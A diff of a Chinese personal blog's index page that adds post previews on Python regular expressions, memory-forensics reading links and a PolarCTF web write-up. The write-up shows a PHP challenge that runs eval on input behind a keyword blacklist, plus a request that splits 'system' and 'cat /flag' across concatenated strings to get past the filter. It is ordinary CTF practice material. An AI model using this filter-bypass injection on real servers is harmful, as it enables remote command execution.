@@ -170,6 +170,322 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/03/27/re%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/daiwei.webp">
+      <meta itemprop="name" content="幽暗天琴">
+      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="幽暗天琴の小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/27/re%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">re正则表达式学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-27 20:18:32" itemprop="dateCreated datePublished" datetime="2025-03-27T20:18:32+08:00">2025-03-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-29 12:35:33" itemprop="dateModified" datetime="2025-03-29T12:35:33+08:00">2025-03-29</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="正则表达式的初识"><a href="#正则表达式的初识" class="headerlink" title="正则表达式的初识"></a>正则表达式的初识</h1><p><em>正则表达式(Regular Expression)</em> 是一种文本模式，用于匹配和筛选特定格式的文本字符串等。</p>
+<p>为了做数据处理相关的题目，所以顺便看看学习和了解一下。</p>
+<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p>在<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程</a>上举了一个例子让我对正则有了一种熟悉的感觉：</p>
+<blockquote>
+<p> 例如，您很可能使用 <strong>?</strong> 和 ***** 通配符来查找硬盘上的文件。**?** 通配符匹配文件名中的 0 个或 1 个字符，而 ***** 通配符匹配零个或多个字符。 </p>
+</blockquote>
+<p>确实，在某些关键字被waf的情况下，常常会用<code>find ~ -name &quot;fla*&quot;</code>，&#96;&#96;find ~ -name “f???”<code>之类的通配符来绕过，这和正则中的符号有些类似。于是目前便自然而然的知道了这两个符号的用法。而剩下的一个量词</code>+<code>则是匹配前面的模式一次或多次，可以理解为**必须有**。也可以</code> {n,m} &#96;来实现确切的次数范围。</p>
+<p><img src="/re%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/regexp-cn.png" alt="img"></p>
+<p>这是菜鸟教程中的一个例子，表示匹配前面的字符集3到15次，<code>^</code>和<code>$</code>分别表示匹配字符串的首尾。</p>
+<h3 id="边界匹配"><a href="#边界匹配" class="headerlink" title="边界匹配"></a>边界匹配</h3><ul>
+<li><code>^</code>：匹配字符串的开头。（在字符集中表示反选）</li>
+<li><code>$</code>：匹配字符串的结尾。</li>
+<li><code>\b</code>：匹配单词边界。</li>
+<li><code>\B</code>：匹配非单词边界。</li>
+</ul>
+<h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><p><code>\w</code>:  匹配字母、数字、下划线。等价于 <strong>[A-Za-z0-9_]</strong></p>
+<p><code>\d</code>:  匹配任意一个阿拉伯数字（0 到 9）。等价于 <strong>[0-9]</strong> </p>
+<p><code>\s</code>: 匹配所有空白符，包括换行。</p>
+<p><code>\S</code>: 非空白符，不包括换行。</p>
+<h3 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h3><blockquote>
+<p> 通过在 *<strong><strong>、</strong>+</strong> 或 <strong>?</strong> 限定符之后放置 **?**，该表达式从”贪婪”表达式转换为”非贪婪”表达式或者最小匹配。 </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;RUNOOB-菜鸟教程&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果是用<code>/&lt;.*&gt;/</code>来匹配则会匹配上面的所有字符。而要想只匹配h1标签头，则可以在<strong>*</strong> 限定符之后放置 **?**，<code>/&lt;.*?&gt;/</code>这样即可。</p>
+<h1 id="Python3中的正则表达式"><a href="#Python3中的正则表达式" class="headerlink" title="Python3中的正则表达式"></a>Python3中的正则表达式</h1><p>在python中常常用<code>re</code>模块来处理正则。</p>
+<h3 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h3><h4 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a><code>re.match</code>函数</h4><p> <code>re.match</code> 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 None。 </p>
+<p><strong>函数语法</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="keyword">match</span>(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>函数参数说明</strong>：</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">pattern</td>
+<td align="left">匹配的正则表达式</td>
+</tr>
+<tr>
+<td align="left">string</td>
+<td align="left">要匹配的字符串。</td>
+</tr>
+<tr>
+<td align="left">flags</td>
+<td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。参见：<a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-reg-expressions.html#flags">正则表达式修饰符 - 可选标志</a></td>
+</tr>
+</tbody></table>
+<h4 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a><code>re.search</code>方法</h4><p> <code>re.search</code> 扫描整个字符串并返回第一个成功的匹配。 </p>
+<h3 id="捕获"><a href="#捕获" class="headerlink" title="捕获"></a>捕获</h3><p>在pattern中用圆括号括起来的部分是可以被捕获字串，我们可以使用 <strong>group(num)</strong> 或 <strong>groups()</strong> 匹配对象函数来获取匹配表达式。</p>
+<table>
+<thead>
+<tr>
+<th align="left">匹配对象方法</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">group(num&#x3D;0)</td>
+<td align="left">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
+</tr>
+<tr>
+<td align="left">groups()</td>
+<td align="left">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
+</tr>
+</tbody></table>
+<h4 id="re-findall方法"><a href="#re-findall方法" class="headerlink" title="re.findall方法"></a><code>re.findall</code>方法</h4><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果有多个匹配模式，则返回元组列表，如果没有找到匹配的，则返回空列表。</p>
+<p><strong>注意：</strong> <code>match</code> 和 <code>search</code> 是匹配一次， <code>findall</code> 匹配所有。经常会有只用search导致匹配的不够。</p>
+<p>暂时先看这么多，后面再用继续看即可。</p>
+<p><code>re.finall(&#39;\&quot;msg\&quot;:\&quot;(.*?)\&quot;&#39;, )</code></p>
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-reg-expressions.html">Python3 正则表达式 | 菜鸟教程</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/03/26/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/daiwei.webp">
+      <meta itemprop="name" content="幽暗天琴">
+      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="幽暗天琴の小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/26/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" class="post-title-link" itemprop="url">内存取证</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-26 20:23:43 / 修改时间：21:17:10" itemprop="dateCreated datePublished" datetime="2025-03-26T20:23:43+08:00">2025-03-26</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>73</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.qwesec.com/2024/01/volatilityInstall.html#%E5%AE%89%E8%A3%85-volatility">volatility 取证工具的安装与配置 | X1ong</a></p>
+<p><a target="_blank" rel="noopener" href="https://r0fus0d.blog.ffffffff0x.com/post/memory-forensics/#%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90">内存取证(总结篇) - r0fus0d 的博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://xdforensics-wiki.github.io/XDforensics-wiki/ram/">内存取证原理学习及Volatility - 篇一</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/03/22/polarctf%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/daiwei.webp">
+      <meta itemprop="name" content="幽暗天琴">
+      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="幽暗天琴の小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/22/polarctf%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">polarctf总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-22 18:00:27 / 修改时间：18:37:22" itemprop="dateCreated datePublished" datetime="2025-03-22T18:00:27+08:00">2025-03-22</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>804</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="web部分"><a href="#web部分" class="headerlink" title="web部分"></a>web部分</h1><h2 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h2><h2 id="简单RCE"><a href="#简单RCE" class="headerlink" title="简单RCE"></a>简单RCE</h2><p>从GPT身上学到一种php中命令执行绕过思路，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;</span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>可以看到是黑名单过滤，通过<code>;</code>可以执行多语句命令，通过变量赋值以及调用即可完成绕过，空格可以用<code>chr(32)</code>代替，所有字符可以利用<code>.</code>来进行来来连接。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://032c9277-dd21-4a2e-9cc6-c3e6158ba6c8.www.polarctf.com:8090/?sys=$a=&quot;s&quot;.&quot;ystem&quot;;$b=&quot;ca&quot;.&quot;t&quot;.chr(32).&quot;/flag&quot;;$a($b);</span><br><span class="line"></span><br><span class="line">POST参数：yyds=666</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><img src="/polarctf%E6%80%BB%E7%BB%93/1742639840152.png" alt="1742639840152"></p>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/index.html">Web安全学习笔记 — Web安全学习笔记 1.0 文档</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/03/20/sqli-labs%E5%88%B7%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -193,10 +509,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-03-20 14:45:43 / 修改时间：14:46:36" itemprop="dateCreated datePublished" datetime="2025-03-20T14:45:43+08:00">2025-03-20</time>
+              <time title="创建时间：2025-03-20 14:45:43" itemprop="dateCreated datePublished" datetime="2025-03-20T14:45:43+08:00">2025-03-20</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-23 15:30:27" itemprop="dateModified" datetime="2025-03-23T15:30:27+08:00">2025-03-23</time>
+              </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -281,7 +603,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-21 21:16:39" itemprop="dateModified" datetime="2025-03-21T21:16:39+08:00">2025-03-21</time>
+                <time title="修改时间：2025-03-21 21:37:38" itemprop="dateModified" datetime="2025-03-21T21:37:38+08:00">2025-03-21</time>
               </span>
 
           <br>
@@ -760,283 +1082,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/02/13/VScode%E4%B8%ADcopilot%E4%BB%A3%E7%A0%81%E6%8F%90%E7%A4%BA%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%AD%E5%92%8C%E5%BC%80%E5%90%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/daiwei.webp">
-      <meta itemprop="name" content="幽暗天琴">
-      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="幽暗天琴の小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/02/13/VScode%E4%B8%ADcopilot%E4%BB%A3%E7%A0%81%E6%8F%90%E7%A4%BA%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%AD%E5%92%8C%E5%BC%80%E5%90%AF/" class="post-title-link" itemprop="url">VScode中copilot代码提示如何关闭和开启</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-02-13 17:34:19 / 修改时间：18:11:22" itemprop="dateCreated datePublished" datetime="2025-02-13T17:34:19+08:00">2025-02-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%97%AE%E9%A2%98%E6%9D%82%E9%A1%B9/" itemprop="url" rel="index"><span itemprop="name">问题杂项</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>169</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​	 在我有一次手贱关闭了copilot代码补全之后想重新开启便遇到了此问题。</p>
-<h5 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h5>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/02/13/VScode%E4%B8%ADcopilot%E4%BB%A3%E7%A0%81%E6%8F%90%E7%A4%BA%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%AD%E5%92%8C%E5%BC%80%E5%90%AF/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/02/11/WSL%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/daiwei.webp">
-      <meta itemprop="name" content="幽暗天琴">
-      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="幽暗天琴の小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/02/11/WSL%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">WSL使用中遇到的一些问题和解决方法</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-02-11 12:35:29" itemprop="dateCreated datePublished" datetime="2025-02-11T12:35:29+08:00">2025-02-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-13 01:00:08" itemprop="dateModified" datetime="2025-02-13T01:00:08+08:00">2025-02-13</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%97%AE%E9%A2%98%E6%9D%82%E9%A1%B9/" itemprop="url" rel="index"><span itemprop="name">问题杂项</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>130</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h5 id="wsl的磁盘从C盘迁移问题"><a href="#wsl的磁盘从C盘迁移问题" class="headerlink" title="wsl的磁盘从C盘迁移问题"></a>wsl的磁盘从C盘迁移问题</h5><p>可参考以下文章的3.2</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yjmyzz/p/wsl2-tutorial-1.html">https://www.cnblogs.com/yjmyzz/p/wsl2-tutorial-1.html</a></p>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yjmyzz/p/wsl2-tutorial-1.html">https://www.cnblogs.com/yjmyzz/p/wsl2-tutorial-1.html</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/02/08/HCTF%E4%B8%AA%E4%BA%BAwp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/daiwei.webp">
-      <meta itemprop="name" content="幽暗天琴">
-      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="幽暗天琴の小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/02/08/HCTF%E4%B8%AA%E4%BA%BAwp/" class="post-title-link" itemprop="url">HCTF个人wp及总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-02-08 00:37:58" itemprop="dateCreated datePublished" datetime="2025-02-08T00:37:58+08:00">2025-02-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-12 23:54:26" itemprop="dateModified" datetime="2025-02-12T23:54:26+08:00">2025-02-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">CTF总结</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>8.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>8 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/02/08/HCTF%E4%B8%AA%E4%BA%BAwp/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1108,7 +1153,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1121,7 +1166,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1165,19 +1210,19 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">45k</span>
+    <span title="站点总字数">48k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">41 分钟</span>
+    <span title="站点阅读时长">43 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共13.5k字</span>
+  <span class="post-count">博客全站共14.7k字</span>
 </div>
         
 
